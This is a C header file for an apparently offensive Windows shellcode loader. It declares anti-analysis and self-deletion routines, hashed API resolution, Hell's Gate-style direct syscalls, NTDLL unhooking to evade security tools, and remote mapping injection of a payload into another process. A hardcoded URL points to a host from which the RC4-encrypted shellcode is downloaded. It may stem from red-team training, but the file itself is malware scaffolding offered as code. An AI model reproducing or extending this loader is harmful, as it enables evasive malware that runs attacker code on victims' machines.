#pragma once

#include <Windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

#ifndef COMMON_H
#define COMMON_H

// contains the defintions of the WinAPIs used
#include "typedef.h"

//--------------------------------------------------------------------------------------------------------------------------
// from AntiAnal.c

// monitor mouse clicks for 20 seconds
#define MONITOR_TIME   20000 

// the new data stream name
#define NEW_STREAM L":MinhNQ2_PVCB"

/*
	function that execute a group of Anti-Analysis functions :
		- Self Deletion
		- Monitoring User Interaction Of Mouse-Clicks
*/
BOOL AntiAnal(DWORD dwMilliSeconds);


//--------------------------------------------------------------------------------------------------------------------------
// 'hasher.exe' output - hash values of syscalls/winapis functions

#define NtQuerySystemInformation_JOAA			0x7B9816D6
#define NtCreateSection_JOAA					0x192C02CE
#define NtMapViewOfSection_JOAA					0x91436663
#define NtUnmapViewOfSection_JOAA				0x0A5B9402
#define NtClose_JOAA							0x369BD981
#define NtCreateThreadEx_JOAA					0x8EC0B84A
#define NtWaitForSingleObject_JOAA				0x6299AD3D
#define NtDelayExecution_JOAA					0xB947891A

#define GetTickCount64_JOAA						0x00BB616E
#define OpenProcess_JOAA						0xAF03507E
#define CallNextHookEx_JOAA						0xB8B1ADC1
#define SetWindowsHookExW_JOAA					0x15580F7F
#define GetMessageW_JOAA						0xAD14A009
#define DefWindowProcW_JOAA						0xD96CEDDC
#define UnhookWindowsHookEx_JOAA				0x9D2856D0
#define GetModuleFileNameW_JOAA					0xAB3A6AA1
#define CreateFileW_JOAA						0xADD132CA
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define CloseHandle_JOAA						0x9E5456F2

#define SystemFunction032_JOAA					0x8CFD40A8


#define KERNEL32DLL_JOAA						0xFD2AD9BD
#define USER32DLL_JOAA							0x349D72E7

//--------------------------------------------------------------------------------------------------------------------------
// from WinApi.c

// seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

CHAR _toUpper(CHAR C);
PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);

//--------------------------------------------------------------------------------------------------------------------------
// from ApiHashing.c

/*
	Api Hashing functions
*/
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

//--------------------------------------------------------------------------------------------------------------------------
// from EalsAte.c

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;


PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(_In_ PVOID pModuleBase, _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(_In_ PVOID pModuleBase, _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, _In_ PVX_TABLE_ENTRY pVxTableEntry);


extern VOID EalsAte(WORD wSystemCall);
extern HellDescent();

//--------------------------------------------------------------------------------------------------------------------------
// from InExt.c

#define KEY_SIZE 16
#define HINT_BYTE 0x61

// used to fetch the addresses of the syscalls / WinAPIs used
BOOL InitializeSyscalls();
// used to get the target process handle 
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
// used to inject the payload after decrypting it to the target process
BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hMainThread, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal);


//--------------------------------------------------------------------------------------------------------------------------

// structure that will be used to save the WinAPIs addresses
typedef struct _API_HASHING {

	fnGetTickCount64				pGetTickCount64;
	fnOpenProcess					pOpenProcess;
	fnCallNextHookEx				pCallNextHookEx;
	fnSetWindowsHookExW				pSetWindowsHookExW;
	fnGetMessageW					pGetMessageW;
	fnDefWindowProcW				pDefWindowProcW;
	fnUnhookWindowsHookEx			pUnhookWindowsHookEx;
	fnGetModuleFileNameW			pGetModuleFileNameW;
	fnCreateFileW					pCreateFileW;
	fnSetFileInformationByHandle	pSetFileInformationByHandle;
	fnCloseHandle					pCloseHandle;

}API_HASHING, * PAPI_HASHING;


// structure that will be used to save the Syscalls Information (ssn - hash - address)
typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtQuerySystemInformation;

	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;

	VX_TABLE_ENTRY NtDelayExecution;

} VX_TABLE, * PVX_TABLE;



#endif // !COMMON_H

//-------------------------------------------------------------------------------------------------------------------------
// Function to download the RC4 Payload

#define SHELLCODE_URL L"http://192.168.1.12:9999/minh.bin"

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);


// -----------------------------------------------------------------------------------------------------------------------
// Functions to Unhook NTDLL

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll);

BOOL ReadNtdllFromASuspendedProcess(IN LPCSTR lpProcessName, OUT PVOID* ppNtdllBuf);

PVOID FetchLocalNtdllBaseAddress();

SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule);
